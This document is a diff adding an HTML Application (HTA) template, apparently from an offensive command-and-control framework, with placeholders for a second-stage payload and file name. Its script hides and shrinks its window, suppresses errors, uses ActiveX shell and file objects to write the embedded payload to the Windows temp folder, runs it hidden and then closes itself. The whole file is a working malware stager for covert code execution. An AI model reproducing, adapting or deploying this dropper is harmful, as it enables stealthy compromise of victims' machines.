@@ -1,0 +1,64 @@
+<html>
+ <head>
+ <script language="JScript">
+
+ try
+ {
+     window.moveTo(-1000, -2000);
+     window.blur();
+     window.resizeTo(2, 4);
+     window.onerror = function(sMsg, sUrl, sLine) { return false; }
+     window.onfocus = function() { window.blur(); }
+     var wscriptshell = new ActiveXObject("WScript.Shell");
+     var fs = new ActiveXObject("Scripting.FileSystemObject");
+     var mshta = unescape("{{ connect_hta }}");
+ } catch (e) {
+   kill();
+ }
+
+function kill() {
+  try {
+    window.close();
+  }
+  catch(e){}
+  try {
+    window.self.close();
+  }
+  catch (e){}
+  try {
+    window.top.close();
+  }
+  catch (e){}
+  try {
+    self.close();
+  }
+  catch (e){}
+}
+
+function main(){
+  try {
+    var tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
+    var path = tmp + "\\" + "{{ artifact }}" + ".hta";
+    var fd = fs.CreateTextFile(path);
+    fd.WriteLine(mshta);
+    fd.close();
+    wscriptshell.run(path, 0, false);
+    var now = new Date().getTime();
+    while((new Date().getTime() - now) < 5000){
+      // do nothing
+    }
+    //fs.DeleteFile(path);
+    kill();
+  } catch (e) {
+    kill();
+  }
+}
+
+main();
+
+ </script>
+ <hta:application caption="no" windowtate="minimize" showInTaskBar="no" scroll="no" navigable="no" />
+ </head>
+ <body>
+ </body>
+</html>
